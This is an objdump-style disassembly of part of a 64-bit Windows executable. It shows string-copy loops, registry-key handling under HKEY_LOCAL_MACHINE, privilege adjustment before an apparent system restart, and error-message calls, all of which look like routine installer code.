   1400016e1:	4c 8b c7             	mov    %rdi,%r8
   1400016e4:	4c 2b c0             	sub    %rax,%r8
   1400016e7:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400016ec:	49 8b d7             	mov    %r15,%rdx
   1400016ef:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400016f6:	48 85 c0             	test   %rax,%rax
   1400016f9:	74 13                	je     0x14000170e
   1400016fb:	42 8a 04 01          	mov    (%rcx,%r8,1),%al
   1400016ff:	84 c0                	test   %al,%al
   140001701:	74 0b                	je     0x14000170e
   140001703:	88 01                	mov    %al,(%rcx)
   140001705:	48 ff c1             	inc    %rcx
   140001708:	48 83 ea 01          	sub    $0x1,%rdx
   14000170c:	75 e1                	jne    0x1400016ef
   14000170e:	48 85 d2             	test   %rdx,%rdx
   140001711:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001715:	48 0f 45 c1          	cmovne %rcx,%rax
   140001719:	44 88 20             	mov    %r12b,(%rax)
   14000171c:	eb 54                	jmp    0x140001772
   14000171e:	4c 8d 05 eb be 00 00 	lea    0xbeeb(%rip),%r8        # 0x14000d610
   140001725:	49 8b d7             	mov    %r15,%rdx
   140001728:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   14000172d:	4c 2b c0             	sub    %rax,%r8
   140001730:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001735:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   14000173c:	48 85 c0             	test   %rax,%rax
   14000173f:	74 13                	je     0x140001754
   140001741:	42 8a 04 01          	mov    (%rcx,%r8,1),%al
   140001745:	84 c0                	test   %al,%al
   140001747:	74 0b                	je     0x140001754
   140001749:	88 01                	mov    %al,(%rcx)
   14000174b:	48 ff c1             	inc    %rcx
   14000174e:	48 83 ea 01          	sub    $0x1,%rdx
   140001752:	75 e1                	jne    0x140001735
   140001754:	48 85 d2             	test   %rdx,%rdx
   140001757:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   14000175b:	4c 8b c7             	mov    %rdi,%r8
   14000175e:	41 8b d7             	mov    %r15d,%edx
   140001761:	48 0f 45 c1          	cmovne %rcx,%rax
   140001765:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000176a:	44 88 20             	mov    %r12b,(%rax)
   14000176d:	e8 96 66 00 00       	call   0x140007e08
   140001772:	ba 2e 00 00 00       	mov    $0x2e,%edx
   140001777:	48 8b cf             	mov    %rdi,%rcx
   14000177a:	e8 39 68 00 00       	call   0x140007fb8
   14000177f:	48 85 c0             	test   %rax,%rax
   140001782:	0f 84 4b 02 00 00    	je     0x1400019d3
   140001788:	48 8d 0d 09 80 00 00 	lea    0x8009(%rip),%rcx        # 0x140009798
   14000178f:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140001793:	ba 01 00 00 00       	mov    $0x1,%edx
   140001798:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000179d:	44 8b cb             	mov    %ebx,%r9d
   1400017a0:	4c 8b c0             	mov    %rax,%r8
   1400017a3:	8d 4a 7e             	lea    0x7e(%rdx),%ecx
   1400017a6:	48 ff 15 6b 7a 00 00 	rex.W call *0x7a6b(%rip)        # 0x140009218
   1400017ad:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400017b2:	83 f8 02             	cmp    $0x2,%eax
   1400017b5:	0f 85 18 02 00 00    	jne    0x1400019d3
   1400017bb:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400017c0:	48 ff 15 61 7a 00 00 	rex.W call *0x7a61(%rip)        # 0x140009228
   1400017c7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400017cc:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400017cf:	0f 84 d6 01 00 00    	je     0x1400019ab
   1400017d5:	c1 e8 04             	shr    $0x4,%eax
   1400017d8:	f7 d0                	not    %eax
   1400017da:	83 e0 01             	and    $0x1,%eax
   1400017dd:	0f 84 c8 01 00 00    	je     0x1400019ab
   1400017e3:	48 8d 15 b6 7f 00 00 	lea    0x7fb6(%rip),%rdx        # 0x1400097a0
   1400017ea:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   1400017ef:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400017f4:	e8 5f fd ff ff       	call   0x140001558
   1400017f9:	48 8b c8             	mov    %rax,%rcx
   1400017fc:	48 85 c0             	test   %rax,%rax
   1400017ff:	74 22                	je     0x140001823
   140001801:	44 38 21             	cmp    %r12b,(%rcx)
   140001804:	48 8d 15 99 7f 00 00 	lea    0x7f99(%rip),%rdx        # 0x1400097a4
   14000180b:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140001810:	48 0f 45 c1          	cmovne %rcx,%rax
   140001814:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001819:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000181e:	e8 35 fd ff ff       	call   0x140001558
   140001823:	bf 00 02 00 00       	mov    $0x200,%edi
   140001828:	b9 40 00 00 00       	mov    $0x40,%ecx
   14000182d:	8b d7                	mov    %edi,%edx
   14000182f:	48 ff 15 b2 7b 00 00 	rex.W call *0x7bb2(%rip)        # 0x1400093e8
   140001836:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000183b:	48 8b d8             	mov    %rax,%rbx
   14000183e:	48 85 c0             	test   %rax,%rax
   140001841:	0f 84 13 02 00 00    	je     0x140001a5a
   140001847:	4c 8b 64 24 30       	mov    0x30(%rsp),%r12
   14000184c:	4c 8d 35 d5 a8 00 00 	lea    0xa8d5(%rip),%r14        # 0x14000c128
   140001853:	49 8b ce             	mov    %r14,%rcx
   140001856:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   14000185b:	48 8d 15 46 7f 00 00 	lea    0x7f46(%rip),%rdx        # 0x1400097a8
   140001862:	41 80 3c 24 00       	cmpb   $0x0,(%r12)
   140001867:	49 0f 45 cc          	cmovne %r12,%rcx
   14000186b:	45 33 c0             	xor    %r8d,%r8d
   14000186e:	48 ff 15 43 7a 00 00 	rex.W call *0x7a43(%rip)        # 0x1400092b8
   140001875:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000187a:	4c 8b cb             	mov    %rbx,%r9
   14000187d:	41 c7 45 00 01 00 00 	movl   $0x1,0x0(%r13)
   140001884:	00 
   140001885:	89 05 b5 bc 00 00    	mov    %eax,0xbcb5(%rip)        # 0x14000d540
   14000188b:	4c 8d 05 ce 7e 00 00 	lea    0x7ece(%rip),%r8        # 0x140009760
   140001892:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140001897:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000189c:	48 8d 15 0d 7f 00 00 	lea    0x7f0d(%rip),%rdx        # 0x1400097b0
   1400018a3:	48 8d 0d 16 7f 00 00 	lea    0x7f16(%rip),%rcx        # 0x1400097c0
   1400018aa:	c7 44 24 20 08 00 00 	movl   $0x8,0x20(%rsp)
   1400018b1:	00 
   1400018b2:	48 ff 15 07 7a 00 00 	rex.W call *0x7a07(%rip)        # 0x1400092c0
   1400018b9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400018be:	45 33 ed             	xor    %r13d,%r13d
   1400018c1:	85 c0                	test   %eax,%eax
   1400018c3:	74 7b                	je     0x140001940
   1400018c5:	83 0d 98 c5 00 00 04 	orl    $0x4,0xc598(%rip)        # 0x14000de64
   1400018cc:	45 38 2c 24          	cmp    %r13b,(%r12)
   1400018d0:	4d 0f 45 f4          	cmovne %r12,%r14
   1400018d4:	4c 2b f6             	sub    %rsi,%r14
   1400018d7:	49 8d 87 fa fe ff 7f 	lea    0x7ffffefa(%r15),%rax
   1400018de:	48 85 c0             	test   %rax,%rax
   1400018e1:	74 13                	je     0x1400018f6
   1400018e3:	42 8a 04 36          	mov    (%rsi,%r14,1),%al
   1400018e7:	84 c0                	test   %al,%al
   1400018e9:	74 0b                	je     0x1400018f6
   1400018eb:	88 06                	mov    %al,(%rsi)
   1400018ed:	48 ff c6             	inc    %rsi
   1400018f0:	49 83 ef 01          	sub    $0x1,%r15
   1400018f4:	75 e1                	jne    0x1400018d7
   1400018f6:	4d 85 ff             	test   %r15,%r15
   1400018f9:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
   1400018fd:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001902:	48 8b cb             	mov    %rbx,%rcx
   140001905:	48 0f 45 c6          	cmovne %rsi,%rax
   140001909:	48 2b d3             	sub    %rbx,%rdx
   14000190c:	44 88 28             	mov    %r13b,(%rax)
   14000190f:	48 8d 87 fe fd ff 7f 	lea    0x7ffffdfe(%rdi),%rax
   140001916:	48 85 c0             	test   %rax,%rax
   140001919:	74 12                	je     0x14000192d
   14000191b:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   14000191e:	84 c0                	test   %al,%al
   140001920:	74 0b                	je     0x14000192d
   140001922:	88 01                	mov    %al,(%rcx)
   140001924:	48 ff c1             	inc    %rcx
   140001927:	48 83 ef 01          	sub    $0x1,%rdi
   14000192b:	75 e2                	jne    0x14000190f
   14000192d:	48 85 ff             	test   %rdi,%rdi
   140001930:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001934:	48 0f 45 c1          	cmovne %rcx,%rax
   140001938:	44 88 28             	mov    %r13b,(%rax)
   14000193b:	e9 42 02 00 00       	jmp    0x140001b82
   140001940:	83 25 1d c5 00 00 fb 	andl   $0xfffffffb,0xc51d(%rip)        # 0x14000de64
   140001947:	66 44 39 2d 29 c5 00 	cmp    %r13w,0xc529(%rip)        # 0x14000de78
   14000194e:	00 
   14000194f:	75 22                	jne    0x140001973
   140001951:	45 8b c7             	mov    %r15d,%r8d
   140001954:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001959:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000195e:	48 8d 35 63 7e 00 00 	lea    0x7e63(%rip),%rsi        # 0x1400097c8
   140001965:	48 ff 15 ac 7a 00 00 	rex.W call *0x7aac(%rip)        # 0x140009418
   14000196c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001971:	eb 07                	jmp    0x14000197a
   140001973:	48 8d 35 5e 7e 00 00 	lea    0x7e5e(%rip),%rsi        # 0x1400097d8
   14000197a:	45 38 2c 24          	cmp    %r13b,(%r12)
   14000197e:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140001983:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001988:	4c 8d 05 49 a7 00 00 	lea    0xa749(%rip),%r8        # 0x14000c0d8
   14000198f:	4d 0f 45 f4          	cmovne %r12,%r14
   140001993:	4c 8b ce             	mov    %rsi,%r9
   140001996:	48 8b d7             	mov    %rdi,%rdx
   140001999:	4c 89 74 24 20       	mov    %r14,0x20(%rsp)
   14000199e:	48 8b cb             	mov    %rbx,%rcx
   1400019a1:	e8 16 f7 ff ff       	call   0x1400010bc
   1400019a6:	e9 d7 01 00 00       	jmp    0x140001b82
   1400019ab:	45 33 c9             	xor    %r9d,%r9d
   1400019ae:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400019b3:	ba 25 05 00 00       	mov    $0x525,%edx
   1400019b8:	44 89 64 24 28       	mov    %r12d,0x28(%rsp)
   1400019bd:	33 c9                	xor    %ecx,%ecx
   1400019bf:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   1400019c6:	00 
   1400019c7:	e8 60 35 00 00       	call   0x140004f2c
   1400019cc:	33 c0                	xor    %eax,%eax
   1400019ce:	e9 bc 01 00 00       	jmp    0x140001b8f
   1400019d3:	ba 2e 00 00 00       	mov    $0x2e,%edx
   1400019d8:	48 8b cf             	mov    %rdi,%rcx
   1400019db:	e8 d8 65 00 00       	call   0x140007fb8
   1400019e0:	48 85 c0             	test   %rax,%rax
   1400019e3:	0f 84 9a 00 00 00    	je     0x140001a83
   1400019e9:	48 8d 0d f8 7d 00 00 	lea    0x7df8(%rip),%rcx        # 0x1400097e8
   1400019f0:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   1400019f4:	ba 01 00 00 00       	mov    $0x1,%edx
   1400019f9:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400019fe:	44 8b cb             	mov    %ebx,%r9d
   140001a01:	4c 8b c0             	mov    %rax,%r8
   140001a04:	8d 4a 7e             	lea    0x7e(%rdx),%ecx
   140001a07:	48 ff 15 0a 78 00 00 	rex.W call *0x780a(%rip)        # 0x140009218
   140001a0e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001a13:	83 f8 02             	cmp    $0x2,%eax
   140001a16:	75 6b                	jne    0x140001a83
   140001a18:	48 8d 35 19 a7 00 00 	lea    0xa719(%rip),%rsi        # 0x14000c138
   140001a1f:	48 8b c3             	mov    %rbx,%rax
   140001a22:	48 ff c0             	inc    %rax
   140001a25:	44 38 24 06          	cmp    %r12b,(%rsi,%rax,1)
   140001a29:	75 f7                	jne    0x140001a22
   140001a2b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001a30:	48 ff c3             	inc    %rbx
   140001a33:	44 38 24 19          	cmp    %r12b,(%rcx,%rbx,1)
   140001a37:	75 f7                	jne    0x140001a30
   140001a39:	48 8d 3c 18          	lea    (%rax,%rbx,1),%rdi
   140001a3d:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001a42:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140001a46:	48 ff 15 9b 79 00 00 	rex.W call *0x799b(%rip)        # 0x1400093e8
   140001a4d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001a52:	48 8b d8             	mov    %rax,%rbx
   140001a55:	48 85 c0             	test   %rax,%rax
   140001a58:	75 10                	jne    0x140001a6a
   140001a5a:	45 33 c9             	xor    %r9d,%r9d
   140001a5d:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140001a62:	45 33 c0             	xor    %r8d,%r8d
   140001a65:	e9 4e ff ff ff       	jmp    0x1400019b8
   140001a6a:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140001a6f:	4c 8b c6             	mov    %rsi,%r8
   140001a72:	48 8d 57 08          	lea    0x8(%rdi),%rdx
   140001a76:	48 8b c8             	mov    %rax,%rcx
   140001a79:	e8 3e f6 ff ff       	call   0x1400010bc
   140001a7e:	e9 ff 00 00 00       	jmp    0x140001b82
   140001a83:	bf 00 04 00 00       	mov    $0x400,%edi
   140001a88:	b9 40 00 00 00       	mov    $0x40,%ecx
   140001a8d:	8b d7                	mov    %edi,%edx
   140001a8f:	48 ff 15 52 79 00 00 	rex.W call *0x7952(%rip)        # 0x1400093e8
   140001a96:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001a9b:	48 8b d8             	mov    %rax,%rbx
   140001a9e:	48 85 c0             	test   %rax,%rax
   140001aa1:	74 b7                	je     0x140001a5a
   140001aa3:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140001aa8:	48 ff 15 79 77 00 00 	rex.W call *0x7779(%rip)        # 0x140009228
   140001aaf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ab4:	83 f8 ff             	cmp    $0xffffffff,%eax
   140001ab7:	74 7d                	je     0x140001b36
   140001ab9:	a8 10                	test   $0x10,%al
   140001abb:	75 79                	jne    0x140001b36
   140001abd:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001ac2:	8b d7                	mov    %edi,%edx
   140001ac4:	48 8d 85 60 01 00 00 	lea    0x160(%rbp),%rax
   140001acb:	4c 2b c0             	sub    %rax,%r8
   140001ace:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001ad5:	48 8d 82 fe fb ff 7f 	lea    0x7ffffbfe(%rdx),%rax
   140001adc:	48 85 c0             	test   %rax,%rax
   140001adf:	74 13                	je     0x140001af4
   140001ae1:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   140001ae5:	84 c0                	test   %al,%al
   140001ae7:	74 0b                	je     0x140001af4
   140001ae9:	88 01                	mov    %al,(%rcx)
   140001aeb:	48 ff c1             	inc    %rcx
   140001aee:	48 83 ea 01          	sub    $0x1,%rdx
   140001af2:	75 e1                	jne    0x140001ad5
   140001af4:	48 85 d2             	test   %rdx,%rdx
   140001af7:	48 8d 41 ff          	lea    -0x1(%rcx),%rax
   140001afb:	48 0f 45 c1          	cmovne %rcx,%rax
   140001aff:	44 88 20             	mov    %r12b,(%rax)
   140001b02:	4d 85 f6             	test   %r14,%r14
   140001b05:	74 6c                	je     0x140001b73
   140001b07:	45 38 26             	cmp    %r12b,(%r14)
   140001b0a:	74 67                	je     0x140001b73
   140001b0c:	4c 8d 05 81 7c 00 00 	lea    0x7c81(%rip),%r8        # 0x140009794
   140001b13:	48 8b d7             	mov    %rdi,%rdx
   140001b16:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001b1d:	e8 e6 f4 ff ff       	call   0x140001008
   140001b22:	4d 8b c6             	mov    %r14,%r8
   140001b25:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001b2c:	48 8b d7             	mov    %rdi,%rdx
   140001b2f:	e8 d4 f4 ff ff       	call   0x140001008
   140001b34:	eb 3d                	jmp    0x140001b73
   140001b36:	48 8d 85 60 01 00 00 	lea    0x160(%rbp),%rax
   140001b3d:	48 2b f0             	sub    %rax,%rsi
   140001b40:	48 8d 95 60 01 00 00 	lea    0x160(%rbp),%rdx
   140001b47:	48 8d 87 fe fb ff 7f 	lea    0x7ffffbfe(%rdi),%rax
   140001b4e:	48 85 c0             	test   %rax,%rax
   140001b51:	74 12                	je     0x140001b65
   140001b53:	8a 04 16             	mov    (%rsi,%rdx,1),%al
   140001b56:	84 c0                	test   %al,%al
   140001b58:	74 0b                	je     0x140001b65
   140001b5a:	88 02                	mov    %al,(%rdx)
   140001b5c:	48 ff c2             	inc    %rdx
   140001b5f:	48 83 ef 01          	sub    $0x1,%rdi
   140001b63:	75 e2                	jne    0x140001b47
   140001b65:	48 85 ff             	test   %rdi,%rdi
   140001b68:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
   140001b6c:	48 0f 45 ca          	cmovne %rdx,%rcx
   140001b70:	44 88 21             	mov    %r12b,(%rcx)
   140001b73:	48 8b d3             	mov    %rbx,%rdx
   140001b76:	48 8d 8d 60 01 00 00 	lea    0x160(%rbp),%rcx
   140001b7d:	e8 66 0f 00 00       	call   0x140002ae8
   140001b82:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001b87:	b8 01 00 00 00       	mov    $0x1,%eax
   140001b8c:	48 89 19             	mov    %rbx,(%rcx)
   140001b8f:	48 8b 8d 60 05 00 00 	mov    0x560(%rbp),%rcx
   140001b96:	48 33 cc             	xor    %rsp,%rcx
   140001b99:	e8 52 6b 00 00       	call   0x1400086f0
   140001b9e:	48 8b 9c 24 b8 06 00 	mov    0x6b8(%rsp),%rbx
   140001ba5:	00 
   140001ba6:	48 81 c4 70 06 00 00 	add    $0x670,%rsp
   140001bad:	41 5f                	pop    %r15
   140001baf:	41 5e                	pop    %r14
   140001bb1:	41 5d                	pop    %r13
   140001bb3:	41 5c                	pop    %r12
   140001bb5:	5f                   	pop    %rdi
   140001bb6:	5e                   	pop    %rsi
   140001bb7:	5d                   	pop    %rbp
   140001bb8:	c3                   	ret
   140001bb9:	cc                   	int3
   140001bba:	cc                   	int3
   140001bbb:	cc                   	int3
   140001bbc:	cc                   	int3
   140001bbd:	cc                   	int3
   140001bbe:	cc                   	int3
   140001bbf:	cc                   	int3
   140001bc0:	48 83 ec 38          	sub    $0x38,%rsp
   140001bc4:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140001bc9:	4c 8d 05 90 7b 00 00 	lea    0x7b90(%rip),%r8        # 0x140009760
   140001bd0:	45 33 c9             	xor    %r9d,%r9d
   140001bd3:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   140001bda:	00 
   140001bdb:	ba 21 05 00 00       	mov    $0x521,%edx
   140001be0:	33 c9                	xor    %ecx,%ecx
   140001be2:	e8 45 33 00 00       	call   0x140004f2c
   140001be7:	48 83 c4 38          	add    $0x38,%rsp
   140001beb:	c3                   	ret
   140001bec:	cc                   	int3
   140001bed:	cc                   	int3
   140001bee:	cc                   	int3
   140001bef:	cc                   	int3
   140001bf0:	cc                   	int3
   140001bf1:	cc                   	int3
   140001bf2:	cc                   	int3
   140001bf3:	cc                   	int3
   140001bf4:	40 53                	rex push %rbx
   140001bf6:	48 83 ec 50          	sub    $0x50,%rsp
   140001bfa:	48 8b 05 07 a4 00 00 	mov    0xa407(%rip),%rax        # 0x14000c008
   140001c01:	48 33 c4             	xor    %rsp,%rax
   140001c04:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140001c09:	48 ff 15 f0 77 00 00 	rex.W call *0x77f0(%rip)        # 0x140009400
   140001c10:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c15:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140001c1a:	ba 28 00 00 00       	mov    $0x28,%edx
   140001c1f:	48 8b c8             	mov    %rax,%rcx
   140001c22:	48 ff 15 47 75 00 00 	rex.W call *0x7547(%rip)        # 0x140009170
   140001c29:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c2e:	33 c9                	xor    %ecx,%ecx
   140001c30:	85 c0                	test   %eax,%eax
   140001c32:	75 23                	jne    0x140001c57
   140001c34:	21 44 24 28          	and    %eax,0x28(%rsp)
   140001c38:	45 33 c9             	xor    %r9d,%r9d
   140001c3b:	45 33 c0             	xor    %r8d,%r8d
   140001c3e:	ba f5 04 00 00       	mov    $0x4f5,%edx
   140001c43:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140001c4a:	00 
   140001c4b:	e8 dc 32 00 00       	call   0x140004f2c
   140001c50:	33 c0                	xor    %eax,%eax
   140001c52:	e9 9e 00 00 00       	jmp    0x140001cf5
   140001c57:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   140001c5c:	48 8d 15 8d 7b 00 00 	lea    0x7b8d(%rip),%rdx        # 0x1400097f0
   140001c63:	48 ff 15 1e 75 00 00 	rex.W call *0x751e(%rip)        # 0x140009188
   140001c6a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001c6f:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001c74:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140001c79:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140001c7f:	45 33 c9             	xor    %r9d,%r9d
   140001c82:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140001c88:	33 d2                	xor    %edx,%edx
   140001c8a:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   140001c91:	00 
   140001c92:	c7 44 24 44 02 00 00 	movl   $0x2,0x44(%rsp)
   140001c99:	00 
   140001c9a:	48 ff 15 0f 75 00 00 	rex.W call *0x750f(%rip)        # 0x1400091b0
   140001ca1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ca6:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140001cab:	8b d8                	mov    %eax,%ebx
   140001cad:	48 ff 15 a4 75 00 00 	rex.W call *0x75a4(%rip)        # 0x140009258
   140001cb4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001cb9:	85 db                	test   %ebx,%ebx
   140001cbb:	75 17                	jne    0x140001cd4
   140001cbd:	ba f6 04 00 00       	mov    $0x4f6,%edx
   140001cc2:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140001cc7:	45 33 c9             	xor    %r9d,%r9d
   140001cca:	45 33 c0             	xor    %r8d,%r8d
   140001ccd:	33 c9                	xor    %ecx,%ecx
   140001ccf:	e9 6f ff ff ff       	jmp    0x140001c43
   140001cd4:	33 d2                	xor    %edx,%edx
   140001cd6:	8d 4a 02             	lea    0x2(%rdx),%ecx
   140001cd9:	48 ff 15 90 78 00 00 	rex.W call *0x7890(%rip)        # 0x140009570
   140001ce0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001ce5:	85 c0                	test   %eax,%eax
   140001ce7:	75 07                	jne    0x140001cf0
   140001ce9:	ba f7 04 00 00       	mov    $0x4f7,%edx
   140001cee:	eb d2                	jmp    0x140001cc2
   140001cf0:	b8 01 00 00 00       	mov    $0x1,%eax
   140001cf5:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140001cfa:	48 33 cc             	xor    %rsp,%rcx
   140001cfd:	e8 ee 69 00 00       	call   0x1400086f0
   140001d02:	48 83 c4 50          	add    $0x50,%rsp
   140001d06:	5b                   	pop    %rbx
   140001d07:	c3                   	ret
   140001d08:	cc                   	int3
   140001d09:	cc                   	int3
   140001d0a:	cc                   	int3
   140001d0b:	cc                   	int3
   140001d0c:	cc                   	int3
   140001d0d:	cc                   	int3
   140001d0e:	cc                   	int3
   140001d0f:	cc                   	int3
   140001d10:	48 8b c4             	mov    %rsp,%rax
   140001d13:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140001d17:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140001d1b:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140001d1f:	55                   	push   %rbp
   140001d20:	41 55                	push   %r13
   140001d22:	41 56                	push   %r14
   140001d24:	48 8d a8 58 fe ff ff 	lea    -0x1a8(%rax),%rbp
   140001d2b:	48 81 ec 90 02 00 00 	sub    $0x290,%rsp
   140001d32:	48 8b 05 cf a2 00 00 	mov    0xa2cf(%rip),%rax        # 0x14000c008
   140001d39:	48 33 c4             	xor    %rsp,%rax
   140001d3c:	48 89 85 80 01 00 00 	mov    %rax,0x180(%rbp)
   140001d43:	be 04 01 00 00       	mov    $0x104,%esi
   140001d48:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001d4d:	44 8b c6             	mov    %esi,%r8d
   140001d50:	33 d2                	xor    %edx,%edx
   140001d52:	e8 52 70 00 00       	call   0x140008da9
   140001d57:	44 8b c6             	mov    %esi,%r8d
   140001d5a:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
   140001d5e:	33 d2                	xor    %edx,%edx
   140001d60:	e8 44 70 00 00       	call   0x140008da9
   140001d65:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   140001d6a:	45 33 f6             	xor    %r14d,%r14d
   140001d6d:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001d72:	48 8d 15 0f a3 00 00 	lea    0xa30f(%rip),%rdx        # 0x14000c088
   140001d79:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140001d7e:	45 33 c9             	xor    %r9d,%r9d
   140001d81:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001d86:	45 33 c0             	xor    %r8d,%r8d
   140001d89:	4c 21 74 24 30       	and    %r14,0x30(%rsp)
   140001d8e:	48 c7 c1 02 00 00 80 	mov    $0xffffffff80000002,%rcx
   140001d95:	c7 44 24 28 1f 00 02 	movl   $0x2001f,0x28(%rsp)
   140001d9c:	00 
   140001d9d:	44 21 74 24 20       	and    %r14d,0x20(%rsp)
   140001da2:	48 ff 15 d7 73 00 00 	rex.W call *0x73d7(%rip)        # 0x140009180
   140001da9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001dae:	85 c0                	test   %eax,%eax
   140001db0:	0f 85 49 02 00 00    	jne    0x140001fff
   140001db6:	33 db                	xor    %ebx,%ebx
   140001db8:	8d 7e c4             	lea    -0x3c(%rsi),%edi
   140001dbb:	44 8b cb             	mov    %ebx,%r9d
   140001dbe:	4c 8d 05 fb a2 00 00 	lea    0xa2fb(%rip),%r8        # 0x14000c0c0
   140001dc5:	ba 50 00 00 00       	mov    $0x50,%edx
   140001dca:	48 8d 0d ff a9 00 00 	lea    0xa9ff(%rip),%rcx        # 0x14000c7d0
   140001dd1:	e8 e6 f2 ff ff       	call   0x1400010bc
   140001dd6:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001ddb:	48 8d 44 24 5c       	lea    0x5c(%rsp),%rax
   140001de0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140001de5:	48 8d 15 e4 a9 00 00 	lea    0xa9e4(%rip),%rdx        # 0x14000c7d0
   140001dec:	4c 21 74 24 20       	and    %r14,0x20(%rsp)
   140001df1:	45 33 c9             	xor    %r9d,%r9d
   140001df4:	45 33 c0             	xor    %r8d,%r8d
   140001df7:	48 ff 15 9a 73 00 00 	rex.W call *0x739a(%rip)        # 0x140009198
   140001dfe:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e03:	85 c0                	test   %eax,%eax
   140001e05:	75 25                	jne    0x140001e2c
   140001e07:	ff c3                	inc    %ebx
   140001e09:	3b df                	cmp    %edi,%ebx
   140001e0b:	7c ae                	jl     0x140001dbb
   140001e0d:	75 1d                	jne    0x140001e2c
   140001e0f:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001e14:	48 ff 15 8d 73 00 00 	rex.W call *0x738d(%rip)        # 0x1400091a8
   140001e1b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001e20:	44 88 35 a9 a9 00 00 	mov    %r14b,0xa9a9(%rip)        # 0x14000c7d0
   140001e27:	e9 d3 01 00 00       	jmp    0x140001fff
   140001e2c:	8b d6                	mov    %esi,%edx
   140001e2e:	48 8d 4d 70          	lea    0x70(%rbp),%rcx
